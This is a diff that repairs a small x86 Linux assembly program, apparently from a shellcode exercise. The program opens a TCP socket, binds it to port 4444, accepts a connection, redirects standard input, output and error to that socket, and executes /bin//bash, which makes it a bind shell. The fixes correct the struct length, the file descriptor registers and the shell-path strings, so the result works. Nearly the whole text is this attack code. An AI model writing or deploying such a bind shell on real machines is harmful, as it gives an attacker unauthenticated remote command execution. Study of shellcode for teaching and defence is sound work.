@@ -1,5 +1,6 @@
 global _start
 
+section .text
 _start:
 
   xor eax, eax
@@ -19,21 +20,22 @@ _start:
   mov edx,eax ; move file descriptor into edx for later
 
 
-  push word 0 ; in_addr_any (last thing in the sockaddr_in struct)
+  push dword 0 ; in_addr_any (last thing in the sockaddr_in struct)
   push word 0x5C11 ; 4444 (base 10) in hex is 0x115C, so in network byte order, it's 0x5C11
   push word 2 ; AF_INET
   mov ecx, esp ; mov stack pointer into ecx for address of struct
 
-  push 24 ; length of sock_addr
+  push byte 16 ; length of sock_addr
   push ecx ; struct
   push edx ; file descriptor returned by first socket call
 
   xor eax,eax
   mov eax, 102 ; socket system call
   mov ebx, 2 ; subfunction number for bind
+  mov ecx, esp
   int 0x80
 
-  push 10 ; 'backlog' argument, same as our python script
+  push 0 ; 'backlog' argument, same as our python script
   push edx ; file descriptor again
   mov ecx,esp ; mov stack pointer into ecx
   mov ebx, 4 ; subfunction number for listen()
@@ -42,7 +44,7 @@ _start:
 
   push 0 ; args for accept()
   push 0 ;
-  push edi ; file descriptor
+  push edx ; file descriptor
 
   mov ecx, esp
 
@@ -51,8 +53,9 @@ _start:
 
   int 0x80
 
-  mov ebx, edx ; file descriptor into ebx because its the first arg
-  mov ecx, 0 ; stdin
+  xor ecx, ecx
+  mov ebx, eax ; file descriptor into ebx because its the first arg
+  mov ecx, 0; stdin
   mov eax, 63 ; syscall # for dup2()
   int 0x80
 
@@ -64,13 +67,16 @@ _start:
   mov ecx, 2; stderr
   int 0x80
 
-  push 0x00687361 ; /bin/bash backwards
-  push 0x622f6e69
-  push 0x622f
+  push dword 0
+  push 0x68736162
+  push 0x2f6e6962
+  push 0x2f2f2f2f
 
   mov ebx, esp
+  mov edx, 0
   mov ecx, 0 ; argv = NULL
-  mov edx, 0 ; envp = NULL
 
   mov eax, 11 ; syscall for execve
   int 0x80
+
+
